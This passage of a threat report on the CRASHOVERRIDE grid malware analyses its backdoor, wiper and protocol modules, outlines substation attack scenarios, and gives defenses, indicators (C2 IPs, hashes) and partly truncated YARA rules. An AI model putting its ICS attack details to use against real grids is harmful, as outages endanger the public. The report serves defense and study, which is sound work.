\ngraphical representation of that ICS through the HMI. The targeting of HMIs alone \nis often not enough to cause physical damage, but it is an ideal target for espio\n-\nnage and positioning in an ICS. Gaining a foothold in the network that had access \nto numerous components of the ICS while maintaining command and control to \nInternet locations, positioned it well for espionage.\nUkraine Cyber Attack 2015\nThe cyber-attack on three power companies in Ukraine on December 23rd, 2015 \nmarked a revolutionary event for electric grid operators. It was the \u02darst known in\n-\nstance where a cyber-attack had disrupted electric grid operations. The Sandworm \nteam was attributed to the attack and their use of the BLACKENERGY 3 malware. \nBLACKENERGY 3 does not contain ICS components in the way that BLACKENER\n-\nGY 2 did. Instead, the adversaries leveraged the BLACKENERGY 3 malware to gain \naccess to the corporate networks of the power companies and then pivot into the \nSCADA networks. While in the environment the adversaries performed their recon\n-\nnaissance and eventually leveraged the grids systems against itself. They learned \nthe operations and used the legitimate functionality of distribution management \nsystems to disconnect substations from the grid leaving 225,000+ customers \nwithout power for upwards of 6 hours until manual operations could restore pow\n-\ner. However, due to the wiping of Windows systems through the KillDisk malware \nand destruction of serial-to-Ethernet devices through malicious \u02darmware updates, \nthe Ukrainian grid operators were without their SCADA environment, meaning they \nlost the ability for automated control, for upwards of a year in some locations. The \nmost notable aspect of the attack was the adversary\u2122s focus on learning how to \nleverage the systems against themselves. Malware enabled the attack, and malware \ndelayed restoration e\u02dborts, but it was the direct interaction of the adversary lever\n-\naging the ICS against itself that resulted in the electric power disruptions, not mal\n-\nware.\n 11\nCRASHOVERRIDE\nThe CRASHOVERRIDE malware impacted a single transmission level substation \nin Ukraine on December 17th, 2016. Many elements of the attack appear to have \nbeen more of a proof of concept than what was fully capable in the malware. The \nmost important thing to understand though from the evolution of tradecraft is the \ncodi\u02dacation and scalability in the malware towards what has been learned through \npast attacks. The malware took an approach to understand and codify the knowl\n-\nedge of the industrial process to disrupt operations as STUXNET did. It leveraged \nthe OPC protocol to help it map the environment and select its targets similar to \nHAVEX. It targeted the libraries and con\u02daguration \u02dales of HMIs to understand the \nenvironment further and leveraged HMIs to connect to Internet-connected lo\n-\ncations when possible as BLACKENERGY 2 had done. And it took the same type \nof approach to understanding grid operations and leveraging the systems against \nthemselves displayed in Ukraine 2015\u2122s attack. It did all of these things with added \nsophistication in each category giving the adversaries a platform to conduct at\n-\ntacks against grid operations systems in various environments and not con\u02daned to \nwork only on speci\u02dac vendor platforms. It marks an advancement in capability by \nadversaries who intend to disrupt operations and poses a challenge for defenders \nwho look to patching systems as a primary defense, using anti-malware tools to \nspot speci\u02dac samples, and relying upon a strong perimeter or air-gapped network \nas a silver-bullet solution. Adversaries are getting smarter, they are growing in their \nability to learn industrial processes and codify and scale that knowledge, and de\n-\nfenders must also adapt.\n 12\nCapabilities\nCapabilities Overview\nThe CRASHOVERRIDE malware is a modular framework consisting of an initial \nbackdoor, a loader module, and several supporting and payload modules.\nThe most important items are the backdoor, which provides access to the infected \nsystem, the loader module, which enables e\u02dbects on the target, and the individual \npayload modules. Dragos focused our analysis on the previously mentioned items \nas they are most relevant for defending grid operations. \nDragos analysts were able to obtain two samples of the malware related to e\u02dbects \non the targeted industrial control system. One sample was the IEC 104 protocol \nmodule, and the other sample was the data wiper. Both samples shared common \ndesign characteristics indicative of being part of a broader ICS attack and manip\n-\nulation framework. ESET was able to uncover an additional IEC 61850 and OPC \nmodule which they have analyzed and shared with Dragos.\nBelow contains an overview of program execution \u02dcow and dependency.\nFigure 2. CRASHOVERRIDE Module Overview Including ESET\u2122s Discoveries\n 13\nModule Commonalities\nDragos analysts were able to determine the compile time for both modules ob\n-\ntained as being within 12 minutes of each other just after 2:30 am on December \n18th in an unknown time zone although timestamps for both samples were zeroed \nout. These times falls in the same timeframe as the Ukraine events. Both mod\n-\nule samples exported a function named Crash that served as the main function to \nbegin execution. The common Crash function enables the ability to \ufb01plug and play\ufb02 \nadditional modules.\nBackdoor/RAT Module\nKey Features\n\u0141\n \nAuthenticates with a local proxy via the internal network established before the \nbackdoor installation\n\u0141\n \nAfter authentication opens HTTP channel to external command and control \nserver (C2) through internal proxy \n\u0141\n \nReceives commands via the external command and control (C2) server\n\u0141\n \nCreates a \u02dale on the local system (contents not determined)\n\u0141\n \nOverwrites an existing service to point to the backdoor so the malware persists \nbetween reboots\nDetails\nAccess to the ICS network \u02dcows through a backdoor module. Dragos obtained \nfour samples which all featured similar functionality. On execution, the malware \nattempts to contact a hard-coded proxy address located within the local network.  \nELECTRUM must establish the internal proxy before the installation of the back\n-\ndoor.\nThe malware expects to communicate to an internal proxy listening on TCP 3128. \nThis port is a default port associated with the Squid proxy. The beaconing contin\n-\nues without pause until it establishes a connection. The backdoor then sends a se\n-\nries of HTTP POST requests with the victim\u2122s Windows GUID (a unique identi\u02daer set \nwith every Windows installation) in the HTTP body. This information authenticates \nthe targeted machine to the command and control (C2) server. If the C2 server \ndoes not respond, the backdoor will exit.\n 14\nIf the authentication is successful to the internal proxy, the malware attempts to per\n-\nform an HTTP CONNECT to an external C2 server via the internal proxy. Across four \nsamples, Dragos identi\u02daed three di\u02dberent C2 addresses which were likely part of the \nDecember 2016 attack on Ukraine:\n \n195.16.88.6\n \n93.115.27.57\n \n5.39.218.152\nA check of the TOR project\u2122s ExoneraTOR service indicates that all of the listed IP ad\n-\ndresses were listed as active TOR nodes during the events in Ukraine.\nWhen performing the HTTP CONNECT, the malware attempts to identify the system \ndefault user agent. If this cannot be determined or does not exist, then a hard-coded \ndefault for the malware is used:\n \nMozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)\nThe malware can be con\u02dagured to beacon out periodically afterwards via a hard-coded \ncon\u02daguration value. The implant is designed to retrieve commands from the C2 server:\n\u0141\n \nCreate a new process as logged in user\n\u0141\n \nCreate a new process as speci\u02daed user via CreateProcessWithLogon\n\u0141\n \nWrite a \u02dale\n\u0141\n \nCopy a \u02dale\n\u0141\n \nExecute a command as logged in user\n\u0141\n \nExecute a command as speci\u02daed user\n\u0141\n \nKill the backdoor\n\u0141\n \nStop a service\n\u0141\n \nSpecify a user (log in as user) and stop a service\n\u0141\n \nSpecify a user (log in as user) and start a service\n\u0141\n \nAlter an existing service to point to speci\u02daed process and change to start at boot\nExecution results in several artifacts left on the host. During execution, the malware \nchecks for the presence of a mutex value. Mutexes are program objects that name re\n-\nsources to enable sharing with multiple program threads. In this case, CRASHOVERRIDE \nchecks the following:\n \n\\Sessions\\1\\Windows\\ApiPortection\n 15\nThe backdoor may also create and check a blank mutex name. Reviewing memo\n-\nry during execution and analysis of other modules in the malware indicates that \\\nSessions\\1\\Windows\\ appears multiple times, indicating that a check may be per\n-\nformed.\nThe backdoor writes a \u02dale to either C:\\Users\\Public\\ or C:\\Users\\<Executing User>\nThe contents of this \u02dale were not discovered during our analysis, and it did not \nappear to be vital to the malware functionality. However, this is a good indicator of \nthe observed activity and may be leveraged to detect this speci\u02dac sample through \nhost-based indicator checking.\nThe service manipulation process is the only persistence mechanism for the mal\n-\nware. When used, the adversary can select an arbitrary system service, direct it to \nrefer to CRASHOVERRIDE, and ensure it is loaded on system boot. If this fails, the \nmalware, although present on disk, will not start when the machine reboots.\nWhen evaluating the options provided to the adversary, an important piece of \nfunctionality associated with most remote access tools is absent: a command to \nex\u02daltrate data. While this functionality could be created via the command execu\n-\ntion options, one would expect this option to be explicit given options to down\n-\nload and copy \u02dales on the host if the adversary intended to use the tool as an \nall-encompassing backdoor and espionage framework. Instead, the functionality \nof this tool is explicitly designed for facilitating access to the machine and execut\n-\ning commands on the system and cannot reasonably be confused as an espionage \nplatform, data stealer, or another such item.\nLauncher Module\nKey Features\n\u0141\n \nLoads payload modules which manipulate the ICS and cause destruction via \nthe wiper\n\u0141\n \nStarts itself as a service likely to hide better\n\u0141\n \nLoads the payload module(s) de\u02daned on the command line during execu\n-\ntion\n\u0141\n \nLaunches the payload and begins either 1 or 2 hours countdown before \nlaunching the data wiper (variant dependent)\n 16\nDetails\nWithin the attack sequence, the ICS payload modules and data wiper module must be \nloaded by a separate loader EXE. Dragos obtained one sample of this \u02dale called the \nLauncher.\nThe launcher takes three parameters on start:\n \nOn launch, the sample analyzed starts a service named defragsvc.  It then loads the \nmodule DLL via an exported function named Crash. A new thread is created at the \nhighest priority on the executing machine.  Control then passes from the launcher to \nthe loaded module while the launcher waits two hours before executing the data wip\n-\ner.\nData Wiper Module\nKey Features\n\u0141\n \nClears all registry keys associated with system services\n\u0141\n \nOverwrites all ICS con\u02daguration \u02dales across the hard drives and all mapped net\n-\nwork drives speci\u02dacally targeting ABB PCM600 con\u02daguration \u02dales in this sample\n\u0141\n \nOverwrites generic Windows \u02dales\n\u0141\n \nRenders the system unusable\nDetails\nOnce executed, the data wiper module clears registry keys, erase \u02dales, and kill pro\n-\ncesses running on the system. A unique characteristic of the wiper is that the main \nfunctionality was implemented within the Crash function.\nThe \u02darst task of the wiper writes zeros into all of the registry keys in: \nSYSTEM\\CurrentControlSet\\Services \nThis registry tree contains initialization values for each service on the system. Removal \nof these values renders a system inoperable. The next wiper task targets ICS con\u02dagu\n-\nration \u02dales across the local hard drive and mapped network drives. The malware au\n-\nthors included functionality to target drives lettered C-Z.\n 17\nThe wiper also targets \u02dale types unique to ABB\u2122s PCM600 product used in substa\n-\ntion automation in addition to more general Windows \u02dales. The below table out\n-\nlines some of the unique \u02dale extensions used by industrial control systems.\nFile Extension\nUsage\n.pcmp\nPCM600 Project (ABB)\n.pcmi\nPCM600 IEC File (ABB)\n.pcmt\nPCM600 Template IED File\n.CIN\nABB MicroScada\n.PL\nProgrammable Logic File\n.paf\nPLC Archive File\n.SCL\nSubstation Con\u02dcguration Language\n.cid\nCon\u02dcgured IED Description\n.scd\nSubstation Con\u02dcguration Description\nTable 1. File extensions targeted by the data wiper module\nIEC 104 Module\nKey Features\n\u0141\n \nReads a con\u02daguration \u02dale de\u02daning the target (likely an RTU) and action to \ntake\n\u0141\n \n\u201aKills\u2122 legitimate the master process on the victim host\n\u0141\n \nMasquerades as the new master\n\u0141\n \nEnters one of four modes:\n\u0141\n \nSequence mode: continuously sets RTU IOAs to open \n\u0141\n \nRange mode: (1) Interrogates each RTU for valid IOAs; (2) toggles each \nIOA between open and closed state\n\u0141\n \nShift mode: unknown at this time\n\u0141\n \nPersist mode: unknown at this time/not fully implemented\n 18\nFigure 3. Protocol Transmission Types in IEC 104\n 19\nFigure 4: Execution Flow of IEC 104 Module in CRASHOVERRIDE\nDetails\nThe CRASHOVERRIDE IEC 104 module is a complete implementation of IEC 104 to \nserve in a \ufb01MASTER\ufb02 role. This raw functionality creates a Swiss army knife for sub\n-\nstation automation manipulation yet also provides tailored functionality. The func\n-\ntions exposed to the malware operator are con\u02daned by the options of the con\u02dagu\n-\nration \u02dale. This report outlines the options analyzed today but notes that extending \nand enhancing functionality is straight forward with the robust protocol implemen\n-\ntation.\n 20\nThe design of the IEC 104 module di\u02dbers from the wiper and suggests that a sec\n-\nondary group of developers could have been involved. Instead of the exported \ncrash function containing the primary execution instructions, the function parses \nthe con\u02dag \u02dale then starts a thread containing the IEC 104 master. The con\u02daguration \n\u02dale can have multiple entries o\u02dbset by [STATION], followed by 13 values:\nFile Extension\nUsage\ntarget_ip\nNONE\ntarget_port\nNONE\nlog\u02dcle\nNONE\nadsu\nNONE\nstop_comm_service\n1\nchange\n1\n\u02dcrst_action\non\nsilence\n0\nuselog\n0\nstop_comm_service_name\n<blank>\ntimeout\n1 second\nsocket_timeout\n15 seconds\nrange\nNONE\nTable 2. IEC-104 module con\u02daguration \u02dale \u02daelds\nThe con\u02daguration \u02dale is critical to achieving an e\u02dbect on the target, as target spec\n-\ni\u02dacations for the device must be provided by the operator in the con\u02daguration \u02dale \nfor the module to function. There are no observed automated means of enumerat\n-\ning the network and then impacting RTUs.\nEach [STATION]entry spawns a thread for follow-on e\u02dbects against ICS equipment. \nOnce the IEC 104 master thread begins, the \u02darst action is to try to kill the commu\n-\nnications service process which acts as the master process. Once the module stops \nthe communications service process, a socket opens with the target IP and desti\n-\nnation port sending data to slave devices and receiving the resulting responses.\n 21\nDepending on the mode de\u02daned within the con\u02daguration \u02dale the module may:\n\u0141\n \nSet speci\u02dac values\n\u0141\n \nEnumerate IOAs on the target devices\n\u0141\n \nContinuously set the IOA to open, or \n\u0141\n \nContinuously toggle the IOA between open and closed states.\nThis module contains no interactive capability.\nRTUs and PLCs, in simplistic terms, act on input and output. Each discrete input \nand output is tied to a memory address. Depending on implementation these ad\n-\ndresses are referred to as coils, registers, or for IEC 104: information object ad\n-\ndresses (IOAs). IOAs are typed and can hold di\u02dberent value types, such as Boolean \nor Unsigned Integer values.  The 104 module properly understands how to enu\n-\nmerate and discover IOAs to operate breakers.\nIEC 101 Module\nThis module was unavailable to Dragos at the time of publication.  ESET\u2122s analysis \nclaims the functionality is equivalent to the IEC 104 module except with communi\n-\ncations over serial. However, Dragos was able to con\u02darm that the module exists.\nIEC 61850 Module\nThis module was unavailable to Dragos at the time of publication.  ESET\u2122s analysis \nclaims once executed the module leverages a con\u02daguration \u02dale to identify targets \nand without a con\u02daguration \u02dale it enumerates the local network to identify poten\n-\ntial targets.  It communicates with the targets to identify whether the device con\n-\ntrols a circuit breaker switch.  For certain variables (no further information avail\n-\nable) it will change their state while also generating an action log. However, Dragos \nwas able to con\u02darm that this module does exist.\nOPC DA Module\nThis module was unavailable to Dragos at the time of publication.  ESET\u2122s analysis \nclaims the module does not require a con\u02daguration.  It enumerates all OPC servers \nand their associated items looking for a subset related to ABB containing the string \nctl. It then writes 0x01 twice  into the item overwriting the proper value giving the \ndevice a primary value out of limits device status. However, Dragos was able to \ncon\u02darm that this module exists.\n 22\nSIPROTEC DoS Module\nThis module was unavailable to Dragos at the time of publication.  ESET\u2122s analysis \nclaims the module sends UDP packets to port 50000 exploiting CVE-2015-5374 \ncausing the SIPROTEC digital relay to fall into an unresponsive state. Dragos could \nnot validate that this module exists.\nCapability Conclusions\nELECTRUM\u2122s ability to adopt a development style described above has several im\n-\nplications: \u02darst, developers can integrate new protocols into the overall framework \nquickly. Second, ELECTRUM could easily leverage external development teams \nskilled at exploiting industrial control systems. Some adversaries would likely ap\n-\nproach capability development through a \u201atwo-tier\u2122 approach: a core development \nteam skilled at writing the overall framework and a second team knowledgeable \nabout a given control system. The platform team would take the control sys\n-\ntem modules and add logic to \u02dat them within the platform. The IEC 104 module \ndemonstrates this approach.\nGiven the execution described with secondary threads the team authoring the \nCrash function likely did not author the IEC 104 master portion of the code. Both \ndevelopment teams probably worked together to decide on a log \u02dale format for \nconsumption by the main Crash function and executed in each of the IEC 104 \nmodule threads.\nImplications of capability\nThis section describes legitimate CRASHOVERRIDE attack and impact scenarios. \nExtensions of these and potential hypothetical scenarios were deemed indetermin\n-\nistic and will not be addressed.\nAttack Option: De-energize substation \nCRASHOVERRIDE, based on prior knowledge, must have a con\u02daguration \u02dale for \ntargeting information of one or multiple RTUs. This con\u02daguration option allows for \nseveral types of activities. One operation the con\u02daguration option allows is \u201ase\n-\nquence.\u2122 \n.\n 23\nThe command sequence polls the target device for the appropriate address\n-\nes. Once it is at the subset of known addresses, it can then toggle the value. The \ncommand then begins an in\u02danite loop and continues to set addresses to this val\n-\nue e\u02dbectively opening closed breakers. If a system operator tries to issue a close \ncommand on their HMI the sequence loop will continue to re-open the breaker. \nThis loop maintaining open breakers will e\u02dbectively de-energize the substation \nline(s) preventing system operators from managing the breakers and re-energize \nthe line(s).\nThe e\u02dbects of de-energizing a line or substation largely depends on the system \ndynamics, power \u02dcows, and other variables. In some circumstances, it may have no \nimmediate impact while in others it could put customers into an outage. It is im\n-\nportant to note that grid operations encompass failure modes and operations can \nnormally compensate. That is, after all, why humans are \u201ain the loop\u2122 to monitor \nand maintain the system.\nFrom a recovery standpoint, the remote sta\u02db will e\u02dbectively have lost control of the \nbreakers and will be required to send crews to the substation.  If the CRASHOVER\n-\nRIDE loop continues unabated, then the crews will likely sever communications as \nboth a troubleshooting and recovery action. Severing communications puts the \nsubstation in manual operation where a physical presence is now required. This \ncould result in a few hours of outages\nAttack Option: Force an Islanding event\nDragos is currently investigating a separate and more disruptive attack option in \nCRASHOVERRIDE as described by ESET. As before, the attacker must have a con\u02dag\n-\nuration \u02dale for targeting information of one or multiple RTUs. This con\u02daguration \u02dale \nnow uses the range command to begin a loop that toggles the status of the break\n-\ner between open and close continuously. The changing breaker status will invoke \nautomated protective operations to isolate (commonly referred to as \u201aislanding\u2122) \nthe substation. This is an intentional self-protective capability of grid operations.\nIn e\u02dbect, this breaker strobing takes the substation o\u02d9ine due to the protective \nrelay scheme\u2122s automated operations causing perturbations of some degree on the \ngrid as scienti\u02dac principles de\u02dane how the behavior interacts with frequencies and \nphases. The variables of these e\u02dbects will dictate impacts but could cause system \ninstabilities depending on the e\u02dbectiveness of the protection relays and their oper\n-\nations. Grid operation contingencies become more critical if multiple substations \nwere under attack likely resulting in many small islanding events. This is assuming \ncoordinated targeting of multiple electric sites and could result in a few days of \noutages.\n 24\nAdding Amplification Attacks\nForcing an islanding of a substation through continual breaker manipulation is sig\n-\nni\u02dacant by itself. However, CRASHOVERRIDE has the potential to amplify this attack \neven more. Two separate CRASHOVERRIDE modules o\u02dber this opportunity.\nUsing OPC to create a Denial of Visibility\nThe OPC module ESET analysis suggests it can brute force values.  Module OPC.\nexe will send out a 0x01 status which for the target systems equates to a \ufb01Primary \nVariable Out of Limits\ufb02 misdirecting operators from understanding protective relay \nstatus.\nBit Mask\nDe\u02dcnition\n0x10\nMore Status Available\n \u0152 More status information is available via \nCommand 48, Read Additional Status Information.\n0x08\nLoop Current Fixed\n \u0152 The Loop Current is being held at a \u02daxed \nvalue and is not responding to process variations.\n0x04\nLoop Current Saturated\n \u0152 The Loop Current has reached its \nupper (or lower) endpoint limit and cannot increase (or decrease) \nany further.\n0x02\nNon-Primary Variable Out of Limits\n \u0152 A Device variable not \nmapped to the PV is beyond its operating limits.\n0x01\nPrimary Variable Out of Limits\n \u0152 The PV is beyond its operating \nlimits.\nThe outcome of the action infers that various systems can either perform actions \non wrong information or report incorrect information to system operators. This \nDenial of Visibility will amplify misunderstanding and confusion while system op\n-\nerators troubleshoot the problem as their system view will show breakers closed \nwhen they are open.\n.\n 25\nUsing CVE-2015-5374 to Hamper Protective Relays\nA second, and more severe, amplifying attack would be to neutralize the auto\n-\nmated protective system by creating a Denial of Service against some or all of the \nprotective relays. This possibility exists in a tool ESET has claimed to have discov\n-\nered that implements the known CVE-2015-5374 Denial of Service condition to the \nSiemens SIPROTEC relays. Siemens released a patch for this in July 2015 under Sie\n-\nmens advisory SCA-732541. At this time it is believed that CVE-2015-5374 causes a \ndenial of service (DoS) of the complete relay functionality and not just the network \ncommunications module.  Dragos has independent evidence that this module ex\n-\nists but it cannot be con\u02darmed.\nHampering the protective scheme by disabling the protective relays can broaden \nthe islanding event and, if done at scale, could trigger a larger event causing multi\n-\nple substations and lines \ufb01islanding\ufb02 from the electric grid.  Siemens SIPROTEC was \nlikely chosen in this attack only because that was the vendor device at the Ukraine \nKiev site attacked in December 2016. This same tactic against digital relays, albe\n-\nit not the same exploit, could have a similar impact on grid operations. However, \nthere are many di\u02dberent types of digital relays each with di\u02dberent con\u02dagurations. \nThis amplifying attack would be very di\u02ddcult to do at scale properly and would \nrequire a signi\u02dacant investment on behalf of the adversary. \n 26\nDefense Recommendations\nDoing the basics is always appropriate, and it signi\u02dacantly helps move ICS into a \ndefensible position. However, they are not worth repeating here, and instead, more \ntailored approaches speci\u02dac to ICS security analysts trying to defend against CRA\n-\nSHOVERRIDE and similar capabilities are presented below:\n\u0141\n \nElectric utility security teams should have a clear understanding of where \nand how IEC 104 and IEC 61850 protocols are used.  North American elec\n-\ntric utilities should include DNP3 on this list in case the malware is extended \nto impact U.S. systems. Look speci\u02dacally for increased usage of the proto\n-\ncols against baselines established in the environment. Also, look for systems \nleveraging these protocols if they have not before and speci\u02dacally try to \nidentify systems that are generating new network \u02dcows using these proto\n-\ncols.\n\u0141\n \nSimilarly, understand OPC implementations and identify how the protocol is \nbeing used. It is a protocol that is pervasive across numerous sectors. Also, \nCRASHOVERRIDE is the second, out of four, ICS tailored malware suite with \nOPC capabilities. OPC will appear abnormal in the CRASHOVERRIDE usage \nas it is being used to scan all devices on the network which would generate \nmore tra\u02ddc than usual.\n\u0141\n \nRobust backups of engineering \u02dales such as project logic, IED con\u02dagura\n-\ntion \u02dales, and ICS application installers should be o\u02d9ine and tested. This will \nhelp reduce the impact of the wiper functionality.\n\u0141\n \nPrepare incident response plans for this attack and perform table top exer\n-\ncises bringing in appropriate stakeholders and personnel across engineer\n-\ning, operations, IT, and security. The scenario should include substation \noutages with the requirement to do manual operations while recovering the \nSCADA environment and gathering appropriate forensics.\n\u0141\n \nThe included YARA rules and other indicators of compromise can be lever\n-\naged to search for possible infections (IOCs). The YARA rules will provide a \nhigher con\u02dadence towards discovering an infection than the other IOCs and \nshould be searched for against Windows OT systems especially noting HMIs.  \nThe behavioral analytics to identify the communications on the network \nwould provide the highest capability to detect this and similar threats.\n 27\nWhile some defenses and architecture changes may have value in other situations, \nthe following are responses that are not appropriate for this attack:\n\u0141\n \nTransmission and distribution companies should not rely on the usage of \nother protocols such as DNP3 as a protection mechanism. The complete\n-\nness of the CRASHOVERRIDE framework suggests there may be other un\n-\ndisclosed modules such as a DNP3 module. Also, adding this functionality \ninto the existing framework would not require extensive work on the part of \nthe adversary.\n\u0141\n \nAir gapped networks, unidirectional \u02darewalls, anti-virus in the ICS, and other \npassive defenses and architecture changes are not appropriate solutions for \nthis attack. No amount of security control will protect against a determined \nhuman adversary. Human defenders are required\n Indicators\nTYPE\nSUBTYPE\nIOC\nDescription\nICS Kill Chain\nImpact\nHost\nMutex Value\nApiPortection9d3\nMutex value checked\nStage 2: Install\nRecon\nHost\nMutex Value\n<Blank Value>\nMutex value created\nStage 2: Install\nRecon\nHost\nFile\nC:\\Users\\<Public OR Executing User>\\\nimapi\nFile dropped and deleted after pro\n-\ngram exit\nStage 2: Install\nRecon\nHost\nService Name\ndefragsvc\nName given to service start\nStage 2: C2\nRemote Access\nNetwork\nIP Address\n195.16.88.6\nExternal C2 server [DEC 2016] (likely \nTOR node at time of attack)\nStage 2: C2\nRemote Access\nNetwork\nIP Address\n93.115.27.57\nExternal C2 server [DEC 2016] (likely \nTOR node at time of attack)\nStage 2: C2\nRemote Access\nNetwork\nIP Address\n5.39.218.152\nExternal C2 server [DEC 2016] (likely \nTOR node at time of attack)\nStage 2: C2\nRemote Access\nNetwork\nUser Agent String\nMozilla/4.0 (compatible; MSIE 7.0; Win\n-\ndows NT 5.1; InfoPath.1)\nDefault user agent string used in C2 \nif unable to get system default user \nagent string\nStage 2: C2\nRemote Access\nHost\nCommand Line\n<Drive>:\\<name>.exe -ip=<IP_address> \n-ports=<ports>\nCommand line arguments used to \nlaunch custom port scanner observed \nwith malware. Command line logging \nrequired to track.\nStage 2: Develop\nRecon\nHost\nRegistry Key\nHKLM\\SYSTEM\\CurrentControlSet\\Ser\n-\nvices\\<target_service_name>\\ImagePath \n<path to malware>\nChange in Service Image Path in the \nsystem registry to point to malware \nallowing malware to restart on system \nreboot.\nStage 2: Installa\n-\ntion\nPersistence\nHost\nSHA1 File Hash\nF6C21F8189CED6AE150F9E\n-\nF2E82A3A57843B587D\nTra\u02dcc to <internalIP>:3128, HTTP \nCONNECT to 5.39.218.152:443. Back\n-\ndoor/RAT. \nPhase2: C2\nRemote Access\nHost\nSHA1 File Hash\nCCCCE62996D\n-\n578B984984426A024D9B250237533\nTra\u02dcc to <internalIP>:3128, HTTP \nCONNECT to 5.39.218.152:443. Back\n-\ndoor/RAT.\nPhase2: C2\nRemote Access\nHost\nSHA1 File Hash\n8E39ECA1E48240C01EE570631AE8F\n-\n0C9A9637187\nBackdoor/RAT Proxy + HTTP CON\n-\nNECT to 93.115.27.57:443. \nPhase2: C2\nRemote Access\nHost\nSHA1 File Hash\n2CB8230281B86FA944D3043AE\n-\n906016C8B5984D9\nBackdoor/RAT Proxy + HTTP CON\n-\nNECT to 195.16.88.6:443 \nPhase2: C2\nRemote Access\n Host\nSHA1 File Hash\n79CA89711CDAEDB16B0CCCCFD\n-\nCFBD6AA7E57120A\nLauncher for payload DLL. Takes input as \nthree command line parameters \u0152 work\n-\ning directory, module, and con\u02dag \u02dale.\nStage 2: Attack\nLoss of Control\nHost\nSHA1 File Hash\n94488F214B165512D2FC0438A581F\n-\n5C9E3BD4D4C\nModule for 104 e\u02dbect. Exports 'Crash' \nwhich is invoked by launcher. Functional\n-\nity requires con\u02dag \u02dale. \nStage 2: Attack\nLoss of Control\nHost\nSHA1 File Hash\n5A5FAFBC3FEC8D36FD57B075EBF\n-\n34119BA3BFF04\nWiper module, wipes list of \u02dales by \nextension, removes system processes, \nand makes registry changes to prevent \nsystem boot. \nStage 2: Attack\nDestruction\nHost\nSHA1 File Hash\nB92149F046F00BB69DE329B8457D\n-\n32C24726EE00\nWiper module, wipes list of \u02dales by \nextension, removes system processes, \nand makes registry changes to prevent \nsystem boot. \nStage 2: Attack\nDestruction\nHost\nSHA1 File Hash\nB335163E6EB854DF5E08E85026B\n-\n2C3518891EDA8\nCustom-built port scanner. \nStage 2: Develop\nRecon\nHost\nSHA1 File Hash\n7FAC2EDDF22FF692E1B4E\n-\n7F99910E5DBB51295E6\nOPC Data Access protocol enumeration \nof servers and addresses \nStage 2: Attack\nLoss of Control\nHost\nSHA1 File Hash\nECF6ADF20A7137A84A1B319C\n-\nCAA97CB0809A8454 \nIEC-61850 enumeration and address \nmanipulation\nStage 2: Attack\nLoss of Control\nHost\nFilename\nopc.exe\nOPC Data Access protocol enumeration \nof servers and addresses \nStage 2: Attack\nLoss of Control\nHost\nFilename\n61850.exe\nIEC-61850 enumeration and address \nmanipulation\nStage 2: Attack\nLoss of Control\nHost\nFilename\nhaslo.exe\nWiper module, wipes list of \u02dales by \nextension, removes system processes, \nand makes registry changes to prevent \nsystem boot. \nStage 2: Attack\nDestruction\nHost\nFilename\n104.dll\nIEC-104 module\nStage 2: Attack\nLoss of Control\nHost\nFilename\nhaslo.dat\nWiper module\nStage 2: Attack\nDestruction\nOPC Server\nOPC Group\nAabdul\nOPC DA Module\nStage 2: Attack\nLoss of Visibility\n 30\nYara Rules\nAlso found at https://github.com/dragosinc/CRASHOVERRIDE\nimport \ufb01pe\ufb02\nimport \ufb01hash\ufb02\nrule dragos_crashoverride_exporting_dlls\n{\n \nmeta:\n  \ndescription = \ufb01CRASHOVERRIDE v1 Suspicious Export\ufb02\n  \nauthor = \ufb01Dragos Inc\ufb02\n \ncondition:\n  \npe.exports(\ufb01Crash\ufb02) & pe.characteristics\n}\nrule dragos_crashoverride_suspcious\n{\n \nmeta:\n  \ndescription = \ufb01CRASHOVERRIDE v1 Wiper\ufb02\n  \nauthor = \ufb01Dragos Inc\ufb02\n \nstrings:\n  \n$s0 = \ufb01SYS_BASCON.COM\ufb02 fullword nocase wide\n  \n$s1 = \ufb01.pcmp\ufb02 fullword nocase wide\n  \n$s2 = \ufb01.pcmi\ufb02 fullword nocase wide\n  \n$s3 = \ufb01.pcmt\ufb02 fullword nocase wide\n  \n$s4 = \ufb01.cin\ufb02 fullword nocase wide\n \ncondition:\n  \npe.exports(\ufb01Crash\ufb02) and any of ($s*)\n}\n        \n 31\nYARA Rules\nrule dragos_crashoverride_name_search {\n \nmeta:\n  \ndescription = \ufb01CRASHOVERRIDE v1 Suspicious Strings and Export\ufb02\n  \nauthor = \ufb01Dragos Inc\ufb02\n \nstrings:\n  \n$s0 = \ufb01101.dll\ufb02 fullword nocase wide\n  \n$s1 = \ufb01Crash101.dll\ufb02 fullword nocase wide\n  \n$s2 = \ufb01104.dll\ufb02 fullword nocase wide\n  \n$s3 = \ufb01Crash104.dll\ufb02 fullword nocase wide\n  \n$s4 = \ufb0161850.dll\ufb02 fullword nocase wide\n  \n$s5 = \ufb01Crash61850.dll\ufb02 fullword nocase wide\n  \n$s6 = \ufb01OPCClientDemo.dll\ufb02 fullword nocase wide\n  \n$s7 = \ufb01OPC\ufb02 fullword nocase wide\n  \n$s8 = \ufb01CrashOPCClientDemo.dll\ufb02 fullword nocase wide\n  \n$s9 = \ufb01D2MultiCommService.exe\ufb02 fullword nocase wide\n  \n$s10 = \ufb01CrashD2MultiCommService.exe\ufb02 fullword nocase wide\n  \n$s11 = \ufb0161850.exe\ufb02 fullword nocase wide\n  \n$s12 = \ufb01OPC.exe\ufb02 fullword nocase wide\n  \n$s13 = \ufb01haslo.exe\ufb02 fullword nocase wide\n  \n$s14 = \ufb01haslo.dat\ufb02 fullword nocase wide     \n \ncondition:\n  \nany of ($s*) and pe.exports(\ufb01Crash\ufb02)\n}\n        \n 32\nYARA Rules\nrule dragos_crashoverride_hashes {\n    meta:\n        description = \ufb01CRASHOVERRIDE Malware Hashes\ufb02\n        author = \ufb01Dragos Inc\ufb02\n    condition:\n\n\n\n\n\n}\n        \n 33\nYARA Rules\nrule dragos_crashoverride_moduleStrings { \n \nmeta:\n  \ndescription = \ufb01IEC-104 Interaction Module Program Strings\ufb02\n  \nauthor = \ufb01Dragos Inc\ufb02\n \nstrings: \n  \n$s1 = \ufb01IEC-104 client: ip=%s; port=%s; ASDU=%u\ufb02 nocase wide ascii \n  \n$s2 = \ufb01 MSTR ->> SLV\ufb02 nocase wide ascii \n  \n$s3 = \ufb01 MSTR <<- SLV\ufb02 nocase wide ascii \n  \n$s4 = \ufb01Unknown APDU format !!!\ufb02 nocase wide ascii \n  \n$s5 = \ufb01iec104.log\ufb02 nocase wide ascii \n \ncondition: \n  \nany of ($s*)\n}\n{\n    meta:\n        author = \ufb01Dragos Inc\ufb02\n    strings:\n        $s0 = { 68 e8 ?? ?? ?? 6a 00 e8 a3 